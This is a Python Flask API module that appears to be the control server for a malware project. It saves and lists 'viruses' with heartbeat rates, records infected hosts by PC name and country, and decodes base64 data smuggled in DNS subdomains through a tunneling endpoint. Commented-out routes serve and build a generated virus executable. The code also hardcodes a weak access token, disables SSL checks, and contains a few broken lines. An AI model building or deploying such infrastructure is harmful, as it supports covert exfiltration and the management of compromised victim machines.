import requests
import base64
from flask import Blueprint, render_template, request, flash, jsonify, send_file, redirect, url_for
from flask_login import login_required, current_user
#from .models import Note, ImageSet, Image
from .models import Virus, Hosts, Archived
import sqlite3
from . import db
import json
import os
import socketio



## Ignore temp lack of ssl
os.environ['CURL_CA_BUNDLE'] = ''


api = Blueprint('api', __name__)
# For development token logic needs to be made
userToken = '1234567890'

def dbConnect():
    global conn
    #conn = sqlite3.connect('/var/www/instance/database.db')
    conn = sqlite3.connect('instance/database.db')
    global curs
    curs = conn.cursor()


#############################
####### USECASE APIs ########
#############################
@api.route('/api/dnstunneling', methods=['GET', 'POST'])
def dnsTunnelingHandler():
    try:
        # Extract the subdomain 
        full_host = request.headers.get('Host')
        if not full_host:
            return jsonify({'message': 'Host header is required'}), 400

        # Get the subdomain portion 
        subdomain = full_host.split('.')[0]
        if not subdomain:
            return jsonify({'message': 'Invalid DNS tunneling format'}), 400

        # Decode the URL-safe Base64 payload
        try:
            decoded_data = base64.urlsafe_b64decode(subdomain).decode('utf-8')
        except Exception as e:
            return jsonify({'message': 'Invalid base64 payload in subdomain', 'error': str(e)}), 400

        # Log the received and decoded data
        print(f"Received subdomain (base64): {subdomain}")
        print(f"Decoded data: {decoded_data}")

        response = {
            'message': 'DNS tunneling processed successfully',
            'decoded_data': decoded_data,
        }
        return jsonify(response), 200

    except Exception as e:
        print(f"Error handling DNS tunneling: {e}")
        return jsonify({'message': 'An error occurred while processing DNS tunneling', 'error': str(e)}), 500




#####################################
####### DATA HANDLING APIs ##########
#####################################

###### Virus calls #######

# @api.route('/download')
# def download_exe():
#     exe_path = '/var/www/rubberduck/virus/generated_script.exe'  
#     return send_file(exe_path, as_attachment=True)


# @api.route('/update', methods=['POST'])
# def update():
#     print("Virus update called!")
#     data = json.loads(request.data)
#     print(data)
#     try:
#         return jsonify({'message': 'success'})  # Return a valid response
#     except Exception as e:
#         print(e)
#         return jsonify({'message': str(e)})  # Return a v

#####

###### Create virus ######
# @login_required
# @api.route('/virusmake', methods=['GET', 'POST'])
# def virusmake():
#     virus.test()
#     try:
#         virus.generateExe("generated_script.py")
#         return jsonify({'message': 'success'})  # Return a valid response
#     except Exception as e:
#         print(e)
#         return jsonify({'message': str(e)})  # Return a valid response with the error message
   



##### SAVE DATA APIS #####

@api.route('/savevirus', methods=['POST'])
@login_required
def saveVirus():
    print("Save virus called")
    try:
        # Get form data
        name = request.form.get('name')  # Virus name
        heartbeat_rate = request.form.get('heartbeat_rate')  # Heartbeat rate
        use_case_settings = request.form.getlist('use_case_settings')  # Use cases (list of selected checkboxes)
        
        # Debugging output
        print(f"Name: {name}")
        print(f"Heartbeat Rate: {heartbeat_rate}")
        print(f"Use Case Settings: {use_case_settings}")

        # Validate required fields
        if not name or not heartbeat_rate:
            return jsonify({'message': 'Name and Heartbeat Rate are required'}), 400

        # Save the virus to the database
        new_virus = Virus(
            name=name,
            heartbeat_rate=heartbeat_rate,
            use_case_settings=','.join(use_case_settings),  # Convert list to comma-separated string
            user_id=current_user.id,  # Use the authenticated user's ID
            is_alive=True
        )
        db.session.add(new_virus)
        db.session.commit()

        flash('Virus created successfully!', category='success')
        return redirect(url_for('views.virus'))  # Adjust to your virus dashboard route

    except Exception as e:
        # Log the error and redirect with an error message
        print(f"Error saving virus: {e}")
        flash('An error occurred while saving the virus.', category='error')
        return redirect(url_for('views.virus'))  # Adjust to your virus dashboard route

## OLD json virus save
# @api.route('/savevirus', methods=['POST'])
# @login_required
# def save_virus():
#     print("Save virus called")
#     try:
#         # Parse request data
#         # print(request.form.get('name'))
#         data = json.loads(request.data)
#         print(data)
#         user_id = data.get('user_id')  # User ID of the creator
#         print(user_id)
#         token = data.get('token')  # Access token for validation
#         print(token)
#         name = data.get('name')  # Name of the virus
#         print(name)
#         heartbeat_rate = data.get('heartbeat_rate')  # Heartbeat rate of the virus
#         print(heartbeat_rate)
#         use_case_settings = data.get('use_case_settings')  # Use cases as a comma-separated string
        
#         # Token validation (replace 'userToken' with your actual validation logic)
#         if token != userToken:  
#             return jsonify({'message': 'Invalid token or duplicate virus'}), 403

#         # Save the virus to the database
#         new_virus = Virus(
#             name=name,
#             heartbeat_rate=heartbeat_rate,
#             use_case_settings=','.join(use_case_settings),  # Ensure it's stored as a comma-separated string
#             user_id=user_id,
#             is_alive=True
#         )
#         db.session.add(new_virus)
#         db.session.commit()

#         return jsonify({'message': 'Virus created successfully!'}), 201

#     except Exception as e:
#         # Log the exception and return an error response
#         print(f"Error saving virus: {e}")
#         return jsonify({'message': 'An error occurred', 'error': str(e)}), 500

# ## saves a virus old
# @api.route('/savevirus', methods=['POST'])
# def saveVirus():
#     data = json.loads(request.data)
#     print(data)
#     user_id = data['user_id']
#     token = data['token']
#     virus_type = data['virus_type']
#     name = data['name']
#     heartbeat_rate = data['heartbeat_rate']
#     print(virus_type)
#     print(user_id)
#     print(name)
#     print(token)
#     if token == userToken :
#         try:
#             dbConnect()
#             curs.execute("INSERT INTO Virus (virus_type, name, heartbeat_rate, user_id) VALUES (?, ?, ?, ?)", (virus_type, name, heartbeat_rate, user_id))
#             conn.commit()
#             conn.close()
#             print("Success")
#             flash('Virus Created!', category='success')
#             return jsonify({'message': 'success'})
#         except Exception as e:
#             print(e)
#             return jsonify({'message': e})
#     else:
#         print("token not valid or duplicate virus")
#         flash('Duplicate virus  or wrong access token', category='error')
#         return jsonify({'message': 'token not valid or duplicate virus '})


## saves a hosts 
@api.route('/savehost', methods=['POST'])
def saveHost():
    data = json.loads(request.data)
    print(data)
    user_id = data['user_id']
    virus_id = data['virus_id']
    token = data['token']
    pc_name = data['pc_name']
    country = data['country']
    host_notes = data['host_notes']
    settings = data['settings']
    last_heartbeat = data['last_heartbeat']
    if token == userToken :
        try:
            dbConnect()
            curs.execute("INSERT INTO Hosts (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat) VALUES (?, ?, ?, ?, ?, ?, ?)", (user_id, virus_id, pc_name, country, host_notes, settings, last_heartbeat))
            conn.commit()
            conn.close()
            print("Success")
            flash('Host Created!', category='success')
            return jsonify({'message': 'success'})
        except Exception as e:
            print(e)
            return jsonify({'message': e})
    else:
        print("token not valid")
        flash('Possible wrong access token', category='error')
        return jsonify({'message': 'token not valid'})


#########################
##### GET DATA APIS #####
#########################

## Get all active virus for the user to display in virus view, needs to be remade together with getvirus, kind of bloat
@login_required
@api.route('/getactivevirus', methods=['GET'])
def getActiveVirus():
    print("getactivevirus")
    try:
        dbConnect()
        print("Trying to get virus table data")

        curs.execute("SELECT * FROM Virus WHERE user_id = ? AND is_alive = 1", (str(current_user.id)))
        rows = curs.fetchall()

        conn.close()
        print("jsondump")
        print(json.dumps(rows))
        return json.loads(json.dumps(rows))
    except Exception as e:
        print(e)
        return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})

@login_required
@api.route('/getvirus', methods=['GET'])
def getVirus():
    try:
        dbConnect()
        print("Trying to get virus table data")

        curs.execute("SELECT * FROM Virus WHERE user_id = ?", (str(current_user.id)))
        rows = curs.fetchall()

        conn.close()
        print("jsondump")
        print(json.dumps(rows))
        return json.loads(json.dumps(rows))
    except Exception as e:
        print(e)
        return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})        

@api.route('/gethosts', methods=['GET'])
def getHosts():
    print("getHosts")
    try:
        dbConnect()
        print("Trying to get Hosts table data")
        curs.execute("SELECT * FROM Hosts WHERE user_id = ?", (str(current_user.id)))
        rows = curs.fetchall()
        conn.close()
        print("jsondump")
        print(json.dumps(rows))
        return json.loads(json.dumps(rows))
    except Exception as e:
        print(e)
        return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})

####### Archive ########
@api.route('/archivevirus', methods=['POST'])
@login_required
def archiveVirus():
    print("archiveVirus called")
    try:
        virus_id = request.form.get("virus_id")
        # Retrieve the virus from the database
        virus = Virus.query.get(virus_id)

        # Ensure the virus exists and belongs to the current user
        if not virus or int(virus.user_id) != int(current_user.id):
            flash('Virus not found or unauthorized.', category='error')
            return redirect(url_for('views.virus'))  

        # Check if the virus is already archived
        if not virus.is_alive:
            flash('Virus is already archived.', category='warning')
            return redirect(url_for('views.virus'))  

        # Create a new entry in the Archived table
        archived_entry = Archived(
            log_name=f"Archived_{virus.name}",  
            virus_id=virus.id,
            user_id=current_user.id
        )
        db.session.add(archived_entry)

        # Update the virus to mark it as not alive
        virus.is_alive = False
        db.session.commit()

        flash('Virus archived successfully!', category='success')
        return redirect(url_for('views.virus'))  

    except Exception as e:
        # Log the error and redirect with an error message
        print(f"Error archiving virus: {e}")
        flash('An error occurred while archiving the virus.', category='error')
        return redirect(url_for('views.virus'))  



####### DELETE APIS ##########
@api.route('/deletevirus', methods=['POST'])
@login_required
def deleteVirus():
    print("deleteVirus called")
    try:
        # Retrieve the virus from the database
        
        virus_id = request.form.get("virus_id")
        virus = Virus.query.get(virus_id)
        print("virus_id")
        print(virus_id)
        print("virus.user_id")
        print(virus.user_id)
        print("current_user.id")
        print(current_user.id)

        # Ensure the virus exists and belongs to the current user
        if int(virus.user_id) != int(current_user.id):
            flash('Virus not found or unauthorized.', category='error')
            return redirect(url_for('views.virus'))  

        # Delete the virus
        dbConnect()
        print("Trying to delete Virus")
        curs.execute("DELETE FROM virus WHERE id = ? AND user_id = ?", (virus_id, current_user.id))
        conn.commit()
        conn.close()
        # db.session.delete(virus)
        # db.session.commit()

        flash('Virus deleted successfully!', category='success')
        return redirect(url_for('views.virus'))  

    except Exception as e:
        print(f"Error deleting virus: {e}")
        flash('An error occurred while deleting the virus.', category='error')
        return redirect(url_for('views.virus'))  

# Old Api to delete virus with binded executed param
# @api.route('/deletevirus', methods=['POST'])
# #@login_required
# def deleteVirus():

#     virus_id = request.form.get('name')  # Virus name
#     user= = request.form.get('heartbeat_rate')  # Heartbeat rate
#     use_case_settings = request.form.getlist('use_case_settings')  # Use cases (list of selected checkboxes)

#     print("deleteVirus called")
#     data = request.get_json()
#     print("data:")
#     print(data)
#     id = data['virus_id']
#     user_id = data['user_id']
#     token = data['token']
#     print(id)
#     print(token)
#     if token == userToken:
#         try:
#             dbConnect()
#             print("Trying to delete Virus")
#             curs.execute("DELETE FROM virus WHERE id = ? AND user_id = ?", (virus_id, user_id))
#             conn.commit()
#             conn.close()
#             print("Virus deleted")
#             flash('Virus deleted!', category='success')
#             return jsonify({'message': 'success'})
#         except Exception as e:
#             return jsonify({'message': e})
#     else:
#         return jsonify({'message': 'token not valid'})


@api.route('/deletehost', methods=['DELETE'])
@login_required
def deleteHost():
    print("deleteHost called")
    data = request.get_json()
    print("data:")
    print(data)
    id = data['host_id']
    user_id = data['user_id']
    token = data['token']
    print(id)
    print(token)
    try:
        dbConnect()
        print("Trying to delete Host")
        curs.execute("DELETE FROM Hosts WHERE id = ? AND user_id = ?", (id, str(current_user.id)))
        conn.commit()
        conn.close()
        print("Host deleted")
        flash('Host deleted!', category='success')
        return jsonify({'message': 'success'})
    except Exception as e:
        return jsonify({'message': e})
    else:
        return jsonify({'message': 'token not valid'})


########## Testing area ############
## Json examples ##
## Gets used to test APIs with json as data in the calls

exampleUser = {
    "user_id": 1,
    "token": "1234567890",
    "email ": "tester@tester.com",
    "password ": "Test12345",
    "public_key ": "shapublic",
    "private_key ": "shaprivate",
    }

exampleVirus = {
    "user_id": 1,
    "token": "1234567890",
    "virus_type": "Silent",
    "name": "TestVirus1",
    "heartbeat_rate": "1h",
    "user_id": 1
    }

exampleHost= {
    "user_id": 1,
    "token": "1234567890",
    "pc_name": "Silent",
    "country": "TestVirus1",
    "host_notes": "1h",
    "settings": "SomeSetting",
    "last_heartbeat": "10/05/2023;21:45",
    "host_notes": "1h",
    "user_id": 1,
    "virus_id": 1,
    }

exampleDeleteHost= {
    "user_id": 1,
    "token": "1234567890",
    "id":1,
    }

exampleDeleteVirus= {
    "user_id": 1,
    "token": "1234567890",
    "id":1,
    }

## Example Python api call which POST to a remote server api with a json object which uses the exampleJson format in a try catch block
### Get examples ###
@api.route('/apivirussendexample', methods=['GET', 'POST'])
def apiVirusExample():
    try:
        url = "http://127.0.0.1:5000/savevirus"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apiupdate', methods=['GET', 'POST'])
def apiApiExample():
    try:
        url = "http://127.0.0.1:5000/update"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleVirus), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"

@api.route('/apihostssendexample', methods=['GET', 'POST'])
def apiHostsExample():
    try:
        url = "http://127.0.0.1.93:5000/savehost"
        headers = {'Content-Type': 'application/json'}
        response = requests.post(url, data=json.dumps(exampleHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
### Get examples ###
@api.route('/apigetvirusexample', methods=['GET', 'POST'])
def apiGetVirusExample():
    try:
        url = "http://127.0.0.1:5000/getvirus"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
    
@api.route('/apigethostsexample', methods=['GET', 'POST'])
def apiGetHostsExample():
    try:
        url = "http://127.0.0.1:5000/gethosts"
        headers = {'Content-Type': 'application/json'}
        response = requests.get(url, data=json.dumps(current_user.id), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"   

### Delete examples ###
@api.route('/apideletevirusexample', methods=['GET', 'POST'])
def apiDeleteVirusExample():
    print("apiDeleteVirusExample")
    print(current_user.id)
    try:
        url = "http://127.0.0.1:5000/deletevirus"
        headers = {'Content-Type': 'application/json'}
        #response = requests.post(url, data=json.dumps(current_user.id), headers=headers)
        response = requests.delete(url, data=json.dumps(exampleDeleteHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"
    
@api.route('/apideletehostsexample', methods=['GET', 'POST'])
def apiDeleteHostsExample():
    print("apiDeleteHostsExample")
    try:
        url = "http://127.0.0.1:5000/deletehost"
        headers = {'Content-Type': 'application/json'}
        response = requests.delete(url, data=json.dumps(exampleDeleteHost), headers=headers)
        return "Success"
    except Exception as e:
        print(e)
        return "Error"   